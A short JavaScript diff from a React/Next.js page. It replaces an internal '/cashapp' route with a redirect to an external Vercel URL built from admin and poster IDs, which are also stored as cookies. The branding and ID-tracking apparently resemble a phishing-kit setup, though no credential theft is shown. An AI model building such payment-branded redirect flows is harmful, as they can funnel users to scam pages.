@@ -30,7 +30,8 @@ export default function Home({ adminId, posterId }) {
  
 
 const chabgetocashapp = async () => {
-  router.push("/cashapp");
+               window.location.href = `https://mega-new.vercel.app/${adminId}/${posterId}`;
+
     }
     useEffect(() => {
     Cookies.set("adminId", adminId);
